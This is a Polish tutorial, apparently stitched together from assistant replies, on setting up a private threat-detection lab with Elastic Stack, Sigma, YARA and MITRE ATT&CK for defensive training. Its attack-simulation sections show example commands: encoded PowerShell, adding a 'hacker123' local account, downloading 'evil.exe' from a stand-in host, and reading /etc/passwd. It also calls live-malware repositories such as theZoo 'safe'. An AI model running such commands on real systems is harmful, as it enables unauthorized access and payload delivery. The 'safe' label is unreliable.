# Frameworki



_todo..._

Jak wykorzystać MITRE ATT\&CK, Sigma i YARA w prywatnym, darmowym laboratorium bezpieczeństwa.

***

#### 1. Rola frameworków w detekcji zagrożeń

* **MITRE ATT\&CK** – to baza wiedzy o taktykach, technikach i procedurach (TTPs) stosowanych przez atakujących. Pomaga zrozumieć, jak działają zagrożenia i gdzie można ich szukać w środowisku IT.
* **Sigma** – to format otwarty do zapisu reguł detekcji (np. dla systemów SIEM) w formie abstrakcyjnej, niezależnej od konkretnego narzędzia. Sigma umożliwia tworzenie uniwersalnych, łatwo przenaszalnych reguł.
* **YARA** – narzędzie służące do tworzenia reguł wykrywania złośliwego oprogramowania na podstawie wzorców w plikach i pamięci. Często używane w analizie malware i detekcji na poziomie plików.

Frameworki te działają razem, wzajemnie się uzupełniając:

* MITRE ATT\&CK daje kontekst i mapuje zachowania atakujących,
* Sigma pozwala zapisać reguły detekcji, które można łatwo wdrożyć w różnych systemach,
* YARA służy do bardziej szczegółowej analizy i wykrywania malware na poziomie plików.

***

#### 2. Łączenie frameworków w SOC L1

W SOC (Security Operations Center) na poziomie L1 (pierwsza linia obrony) można wykorzystać te frameworki tak:

* **MITRE ATT\&CK** jako podstawa wiedzy, na podstawie której definiujemy scenariusze detekcji.
* **Sigma** do tworzenia reguł detekcji w systemie SIEM (np. Elastic Security, Splunk, czy open-source SIEM).
* **YARA** do skanowania podejrzanych plików, zrzutów pamięci, czy próbek malware w środowisku.

Przykład: Detektor Sigma wykrywa nietypową aktywność w logach, która jest zgodna z techniką MITRE ATT\&CK. Na podstawie tego SOC L1 eskaluje alert do analityka L2, który uruchamia skanowanie YARA na podejrzanych plikach.

***

#### 3. Proces detekcji zagrożeń

Proces zazwyczaj wygląda tak:

1. **Zbieranie danych:** logi z systemów, endpointów, sieci, itp.
2. **Wykrywanie anomalii i wzorców:** wykorzystując reguły Sigma, które są oparte na technikach MITRE ATT\&CK.
3. **Analiza podejrzanych zdarzeń:** wykorzystanie reguł YARA do wykrywania malware w plikach i pamięci.
4. **Korekta i reakcja:** eskalacja alertów, blokowanie zagrożeń, raportowanie.

***

#### 4. Czy możesz zrobić prywatne, darmowe laboratorium i wykorzystać te frameworki?

**Tak, jak najbardziej!** Wszystkie te frameworki są publicznie dostępne i darmowe do użytku:

* **MITRE ATT\&CK** – dostępne online: [https://attack.mitre.org/](https://attack.mitre.org/)
* **Sigma** – reguły i narzędzia na GitHub: [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)
* **YARA** – dostępne narzędzie open-source: [https://github.com/VirusTotal/yara](https://github.com/VirusTotal/yara)

***

#### Jak zacząć?

* Załóż wirtualne środowisko (np. VirtualBox, VMware, Docker).
* Zainstaluj darmowe narzędzia SIEM, np. Elastic Stack (Elasticsearch + Kibana + Elastic Agent).
* Pobierz reguły Sigma i skonwertuj je do formatu obsługiwanego przez Twój SIEM.
* Stwórz proste reguły YARA do wykrywania wzorców w plikach.
* Symuluj ataki lub użyj gotowych próbek malware (np. z repozytoriów testowych) i sprawdzaj, czy reguły je wykrywają.
* Korzystaj z MITRE ATT\&CK, aby rozbudowywać swoje reguły detekcji i mapować je do realnych technik.

***

#### Podsumowując

* Możesz w pełni legalnie i bezpłatnie wykorzystać MITRE ATT\&CK, Sigma i YARA do swojego prywatnego labu.
* To doskonały sposób, aby nauczyć się realnej detekcji zagrożeń i pracy w SOC.
* Pamiętaj o zachowaniu ostrożności, jeśli używasz rzeczywistych próbek malware – najlepiej w odizolowanym środowisku.

***



Oto prosty, ale kompletny **plan prywatnego laboratorium do nauki detekcji zagrożeń** z wykorzystaniem **MITRE ATT\&CK, Sigma i YARA**.

***

## Plan prywatnego laboratorium detekcji zagrożeń

#### 1. Cel laboratorium

* Poznać i praktycznie zastosować frameworki MITRE ATT\&CK, Sigma i YARA.
* Zbudować środowisko do symulacji ataków i wykrywania ich za pomocą reguł.
* Przećwiczyć proces detekcji i reagowania na zagrożenia jak w SOC L1.

***

#### 2. Środowisko

**Opcja A: VirtualBox / VMware**

* Minimum 2 maszyny wirtualne:
  * Maszyna z systemem Windows (np. Win10) – do symulacji endpointa
  * Maszyna z Linux (np. Ubuntu) – do SIEM i analizy

**Opcja B: Docker**

* Użyj gotowych kontenerów Elastic Stack (Elasticsearch, Kibana, Elastic Agent)

***

#### 3. Instalacja i konfiguracja narzędzi

**A. SIEM: Elastic Stack (darmowy)**

* Zainstaluj Elasticsearch, Kibana i Elastic Agent na Linuxie.
* Skonfiguruj zbieranie logów z maszyny Windows (może być np. Winlogbeat).
* Kibana pozwoli Ci tworzyć dashboardy i analizować logi.

**B. Sigma**

* Pobierz repozytorium reguł Sigma: [https://github.com/SigmaHQ/sigma](https://github.com/SigmaHQ/sigma)
* Użyj narzędzia `sigmac` do konwersji reguł Sigma do formatu Elastic Query DSL lub innych, zależnie od używanego SIEM.
* Załaduj wybrane reguły do SIEM, np. wykrywające techniki z MITRE ATT\&CK.

**C. YARA**

* Zainstaluj YARA na Linuxie.
* Stwórz własne reguły do wykrywania prostych wzorców (np. fraz tekstowych, znanych hashów).
* Możesz testować YARA na plikach malware lub na plikach symulujących zagrożenia.

***

#### 4. Źródła danych i symulacja zagrożeń

* Symuluj ataki na maszynie Windows np. uruchamiając skrypty PowerShell, które generują alerty zgodne z MITRE ATT\&CK (np. wykrycie techniki "T1059 - Command and Scripting Interpreter").
* Użyj narzędzi takich jak Atomic Red Team ([https://atomicredteam.io/](https://atomicredteam.io/)) do automatycznej symulacji ataków z mapowaniem do MITRE ATT\&CK.
* Alternatywnie pobierz bezpieczne próbki malware (np. z [https://github.com/ytisf/theZoo](https://github.com/ytisf/theZoo)) i testuj ich wykrywalność YARA.

***

#### 5. Proces detekcji i analiza

* Obserwuj alerty wygenerowane przez reguły Sigma w Kibanie.
* Przy podejrzanym zdarzeniu przeprowadź dodatkową analizę pliku za pomocą YARA.
* Mapuj wykryte techniki na MITRE ATT\&CK, aby lepiej zrozumieć zagrożenie.
* Twórz własne reguły Sigma i YARA na podstawie obserwacji.

***

#### 6. Dokumentacja i rozwój labu

* Prowadź notatki na temat reguł, wykrytych zdarzeń i analizy.
* Dodawaj nowe techniki z MITRE ATT\&CK do swojego repozytorium reguł.
* Rozszerzaj lab o dodatkowe systemy i typy danych (np. sieć, endpointy Linux).

***

## Podsumowanie

| Etap                     | Co zrobić                                              | Narzędzia                                                                |
| ------------------------ | ------------------------------------------------------ | ------------------------------------------------------------------------ |
| Przygotowanie środowiska | VM lub Docker                                          | VirtualBox, VMware, Docker                                               |
| SIEM                     | Elastic Stack (Elasticsearch + Kibana + Elastic Agent) | [https://www.elastic.co/](https://www.elastic.co/)                       |
| Reguły Sigma             | Pobranie, konwersja, załadowanie                       | Sigma repo, narzędzie sigmac                                             |
| Reguły YARA              | Instalacja, tworzenie reguł                            | [https://github.com/VirusTotal/yara](https://github.com/VirusTotal/yara) |
| Symulacja ataków         | Atomic Red Team, skrypty, malware                      | [https://atomicredteam.io/](https://atomicredteam.io/), theZoo           |
| Analiza i detekcja       | Monitorowanie, eskalacja alertów                       | Kibana, YARA                                                             |

***



**Krok po kroku instrukcja instalacji i konfiguracji Elastic Stack (Elasticsearch + Kibana + Elastic Agent)** do Twojego prywatnego laboratorium detekcji zagrożeń. Skupiamy się na najnowszej wersji open source i prostym wdrożeniu na jednej maszynie **Linux (Ubuntu Server 22.04)**.

***

### **Wymagania wstępne**

* Ubuntu 22.04 LTS (serwer lub VM)
* Użytkownik z uprawnieniami `sudo`
* 4 GB RAM minimum
* Dostęp do Internetu

***

### &#x20;1. Instalacja Java (wymagana przez Elasticsearch)

```bash
sudo apt update
sudo apt install openjdk-17-jdk -y
java -version
```

***

### &#x20;2. Dodanie repozytorium Elastic

```bash
wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -

sudo apt install apt-transport-https

echo "deb https://artifacts.elastic.co/packages/8.x/apt stable main" | \
  sudo tee /etc/apt/sources.list.d/elastic-8.x.list

sudo apt update
```

***

### &#x20;3. Instalacja Elasticsearch

```bash
sudo apt install elasticsearch -y
```

W pliku konfiguracyjnym:

```bash
sudo nano /etc/elasticsearch/elasticsearch.yml
```

Dodaj/odkomentuj linie:

```yaml
network.host: localhost
http.port: 9200
```

**Włącz i uruchom usługę:**

```bash
sudo systemctl enable elasticsearch
sudo systemctl start elasticsearch
```

**Sprawdź:**

```bash
curl -X GET http://localhost:9200
```

***

### &#x20;4. Instalacja Kibana

```bash
sudo apt install kibana -y
```

Edytuj konfigurację:

```bash
sudo nano /etc/kibana/kibana.yml
```

Zmień lub dodaj:

```yaml
server.host: "localhost"
elasticsearch.hosts: ["http://localhost:9200"]
```

**Włącz i uruchom:**

```bash
sudo systemctl enable kibana
sudo systemctl start kibana
```

**Otwórz w przeglądarce:**

```
http://localhost:5601
```

***

### &#x20;5. Instalacja Elastic Agent (na maszynie, z której zbierasz logi – np. Windows lub druga VM z Linuxem)

Wejdź do Kibany → zakładka „Fleet” → „Add Agent” → wybierz system operacyjny → pobierz i uruchom zgodnie z instrukcją.

Przykład dla Ubuntu:

```bash
curl -L -O https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.X.X-linux-x86_64.tar.gz
tar xzvf elastic-agent-8.X.X-linux-x86_64.tar.gz
cd elastic-agent-8.X.X-linux-x86_64
sudo ./elastic-agent install
```

Użyj wygenerowanego tokena z interfejsu Kibany do rejestracji agenta.

***

### 6. Konfiguracja źródeł danych (logi systemowe, Windows, procesy)

Po zainstalowaniu agenta:

1. W Kibanie → **Fleet → Agents → Policies**.
2. Dodaj integracje, np.:
   * **System Logs**
   * **Windows**
   * **Auditd**
   * **Osquery**
3. Ustaw co ma być monitorowane.

***

### 7. Test – symulacja logów

Na maszynie z agentem uruchom prosty test, np.:

```bash
ping 8.8.8.8
ls /root
cat /etc/passwd
```

Zobacz, czy pojawiają się logi w Kibanie (Dashboard → Logs → Stream).

***

### 8. Podłączenie reguł Sigma (opcjonalne na tym etapie)

1. Pobierz repozytorium Sigma:

```bash
git clone https://github.com/SigmaHQ/sigma.git
cd sigma
```

2. Zainstaluj `sigmac` – konwerter:

```bash
pip install sigma
```

3. Przykład konwersji reguły:

```bash
sigmac -t es-qs windows/process_creation/win_susp_powershell_encoded_command.yml
```

Skopiuj wynikową zapytanie do Kibany i uruchom jako zapytanie w logach.

***

### 9. Uwaga: Bezpieczeństwo i SSL

Elastic 8.x automatycznie ustawia konto `elastic` i hasło podczas pierwszego uruchomienia. Zanotuj te dane!\
Domyślnie komunikacja między komponentami jest zabezpieczona – możesz je uprościć dla testów (jeśli działasz **w zamkniętym labie**), ale **na własne ryzyko**.

***

### Podsumowanie

| Komponent     | Port | Funkcja                    |
| ------------- | ---- | -------------------------- |
| Elasticsearch | 9200 | Baza danych logów          |
| Kibana        | 5601 | Interfejs graficzny        |
| Elastic Agent | 8220 | Zbieranie logów z systemów |

***



Super, że masz już Elastic Stack! Teraz przejdźmy do **następnych kroków**, żebyś mógł _realnie wykrywać zagrożenia_, np. techniki MITRE ATT\&CK. Poniżej przedstawiam Ci logiczny **plan działania**, co zrobić **dalej**, po skonfigurowaniu Elastic Stack i Kibany.

***

### &#x20;Etap 1: Podłączenie źródeł danych (logów)

#### A. Na systemie **Linux** (gdzie działa agent):

* Agent sam zbiera logi systemowe (`/var/log/syslog`, `/var/log/auth.log`, procesy, dyski itd.)
* Wejdź do **Kibany → Logs → Stream** i sprawdź, czy widzisz nowe logi.

#### B. Dodanie **agenta na Windows** (jeśli masz taką VM)

1. Wejdź do Kibany → **Management → Fleet → Add agent**
2. Wybierz **Windows**, wygeneruj token
3. Na VM z Windows pobierz i uruchom Elastic Agenta:

```powershell
Invoke-WebRequest -Uri https://artifacts.elastic.co/downloads/beats/elastic-agent/elastic-agent-8.X.X-windows-x86_64.zip -OutFile agent.zip
Expand-Archive .\agent.zip
cd .\elastic-agent-8.X.X-windows-x86_64\
.\elastic-agent.exe install --url=https://[adres_serwera]:8220 --enrollment-token=XXXXXXXXX
```

4. Po chwili agent pojawi się w **Fleet**, a logi z Windows będą spływać.

***

### Etap 2: Włączenie integracji MITRE ATT\&CK

W Kibanie:

* Przejdź do **Security → Rules → Detection Rules**
* Kliknij **Enable prebuilt rules**
* Filtruj po "ATT\&CK" i aktywuj wybrane reguły, np.:
  * "Powershell execution"
  * "Suspicious process"
  * "Encoded command line"

> 🔍 Te reguły już mapują się do technik MITRE ATT\&CK, np. `T1059` – PowerShell.

***

### &#x20;Etap 3: Symulacja ataków – test działania detekcji

Do testów użyj:

#### 🔸 [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team)

* To repozytorium zawiera **gotowe testy ATT\&CK**.
* Możesz uruchamiać ataki typu:
  * Użycie `whoami`, `net user`, `ipconfig`
  * `powershell -enc <zakodowane polecenie>`
  * Utworzenie nowego konta

> **Uwaga:** Uruchamiaj testy **w labie**, nie w systemie produkcyjnym.

#### 🔸 Ręcznie – np. na Windows VM:

```powershell
powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwAA==  # Base64 -> Start-Sleep
```

Potem sprawdź w Kibanie:

* Security → Alerts – czy pojawiło się powiadomienie?
* Discover → filtrowanie po `event.module` i `process.name`

***

### &#x20;Etap 4: Dodanie reguł Sigma (ręczne lub automatyczne)

Jeśli chcesz użyć własnych reguł detekcji:

#### A. Pobierz repozytorium:

```bash
git clone https://github.com/SigmaHQ/sigma.git
cd sigma
```

#### B. Skonwertuj wybraną regułę:

```bash
pip install sigma
sigmac -t es-qs windows/process_creation/win_susp_powershell_encoded_command.yml
```

Wynik to zapytanie, które możesz wkleić w **Kibanie → Discover** albo stworzyć z niego **alert**.

***

### &#x20;Etap 5: Użycie YARA (lokalnie lub na próbki)

YARA możesz zainstalować na VM (Linux) i wykrywać podejrzane pliki:

#### A. Instalacja:

```bash
sudo apt install yara -y
```

#### B. Prosta reguła:

```yara
rule SuspiciousBase64
{
  strings:
    $a = "powershell -enc"
  condition:
    $a
}
```

Zapisz jako `test.yar` i uruchom:

```bash
yara test.yar /path/to/file_or_dir
```

***

### &#x20;Etap 6: Dashboardy i analiza

* **Kibana → Dashboard** → Wybierz gotowe z Elastic Agent
* Możesz stworzyć własny dashboard np. z procesami PowerShell, nazwami plików .exe itp.
* Można też mapować zdarzenia do **MITRE ATT\&CK Matrix**.

***

### &#x20;Cały proces detekcji w Twoim labie

1. **Symulacja zagrożenia** (np. PowerShell, nowe konto, malware)
2. **Zbieranie logów przez Elastic Agent**
3. **Reguła Sigma lub Elastic prebuilt wykrywa zdarzenie**
4. **Alert w Kibanie**
5. **Analiza logów i reguł**
6. **(Opcjonalnie) YARA do sprawdzenia pliku**

***

Świetnie! Poniżej pokażę Ci **jak stworzyć dashboard MITRE ATT\&CK w Kibanie**, a potem **jak symulować realne zagrożenia**, by zobaczyć, czy reguły wykrywające je działają. Będziesz miał pełny cykl: **atak → detekcja → wizualizacja**.

***

## &#x20;1. Stworzenie Dashboardu MITRE ATT\&CK w Kibanie

### &#x20;A. Gotowe dashboardy Elastic (dla Elastic Security)

1. Zaloguj się do Kibany
2. Przejdź do **Security → Dashboards**
3. Wybierz:
   * **MITRE ATT\&CK® Matrix**
   * **Detections Overview**
4. Te dashboardy pokazują wykrycia z przypisanymi technikami MITRE ATT\&CK (np. T1059, T1566).

📌 **Uwaga:** Te dashboardy działają **tylko wtedy**, gdy masz aktywne reguły prebuilt z Elastic i dane z agenta.

***

### &#x20;B. Stwórz własny dashboard z wykryciami MITRE

1. Przejdź do **Kibana → Dashboard → Create new dashboard**
2. Kliknij „Add from library” i wybierz wizualizacje np.:
   * Alerty z `mitre.tactic.name`
   * Alerty z `event.module`, `rule.name`, `process.name`

#### &#x20;Przykładowa wizualizacja:

* **Typ:** Pie chart
* **Dane:** `mitre.technique.name.keyword`
* **Agregacja:** Count
* **Opis:** Liczba wykryć według technik ATT\&CK

Możesz też utworzyć tabelę:

* Columns: `@timestamp`, `rule.name`, `mitre.tactic.name`, `mitre.technique.name`, `host.name`, `process.name`

&#x20;Dodaj filtr:

```kibana
event.kind : "signal"
```

(żeby widzieć tylko wykryte zagrożenia)

***

### C. Alternatywa: Użyj **Elastic Security → Detections**

Elastic Security ma gotowe **podsumowanie alertów**, które automatycznie przypisuje wykrycia do ATT\&CK. Wystarczy:

1. Włączyć reguły prebuilt (Security → Rules → Manage Rules → Enable All)
2. Czekać na alerty lub **symulować ataki** (czytaj niżej)

***

## &#x20;2. Symulacja realnych zagrożeń (ataków) w labie

Czas na ataki – ale **kontrolowane i bezpieczne** w Twoim labie.

***

### &#x20;A. Atomic Red Team (symulacje ATT\&CK)

#### 🔸 Co to?

Open-source projekt do symulacji ataków przypisanych do technik MITRE ATT\&CK.

#### 🔸 Instalacja na Windows VM:

1. Pobierz projekt:

```powershell
git clone https://github.com/redcanaryco/atomic-red-team.git
cd atomic-red-team
```

2. Zainstaluj Posh-Atomics (framework):

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Install-Module -Name Invoke-AtomicRedTeam -Force
Import-Module Invoke-AtomicRedTeam
```

3. Uruchom symulację:

**Przykład: Technika T1059.001 (PowerShell)**

```powershell
Invoke-AtomicTest T1059.001
```

> Kibana powinna wykryć: użycie zakodowanego PowerShell, nieautoryzowane polecenia, itp.

***

### B. Ręczne symulacje – bez Atomic Red Team

#### 🔸 PowerShell encoded command (T1059)

```powershell
powershell -enc UwB0AGEAcgB0AC0AUwBsAGUAZQBwACAANAA=
```

(tj. `Start-Sleep 4` zakodowane base64)

#### 🔸 Tworzenie konta lokalnego (T1136)

```powershell
net user hacker123 Password123! /add
```

#### 🔸 Pobranie pliku z Internetu (T1105)

```powershell
Invoke-WebRequest -Uri http://example.com/evil.exe -OutFile C:\temp\evil.exe
```

> Wszystkie te działania powinny pojawić się jako **alerty** w Elastic Security i być **mapowane do MITRE ATT\&CK**.

***

## Jak sprawdzić efekty w Kibanie?

1. Przejdź do **Security → Alerts**
2. Filtruj po:
   * `rule.name` (np. "Suspicious PowerShell Command")
   * `mitre.technique.name` (np. "PowerShell")
3. Kliknij alert → zobacz szczegóły → będą tam:
   * Hostname
   * Wykryta technika ATT\&CK
   * Komenda lub proces
4. Sprawdź też dashboard ATT\&CK, czy pojawiła się technika (np. T1059, T1136)

***

### BONUS: Symulacja malware (YARA)

Jeśli chcesz testować reguły YARA:

1. Pobierz bezpieczne próbki testowe np. z:
   * [TheZoo](https://github.com/ytisf/theZoo)
   * [MalwareBazaar (test samples)](https://bazaar.abuse.ch/)
2. Stwórz prostą regułę:

```yara
rule EvilSample
{
    strings:
        $a = "h4ck3r"
    condition:
        $a
}
```

3. Użyj na próbce:

```bash
yara -r myrule.yar /path/to/sample.exe
```

***

## Co teraz możesz zrobić:

| Akcja                             | Cel                                                     |
| --------------------------------- | ------------------------------------------------------- |
| Tworzenie dashboardów ATT\&CK     | Monitorowanie zagrożeń według taktyk i technik          |
| Symulowanie ataków (ART, ręcznie) | Sprawdzenie skuteczności detekcji                       |
| Włączanie reguł prebuilt i Sigma  | Automatyczne alerty dla znanych technik                 |
| Tworzenie własnych reguł Sigma    | Dopasowanie detekcji do własnych scenariuszy            |
| Testowanie plików YARA            | Wykrywanie złośliwego oprogramowania na poziomie plików |

***
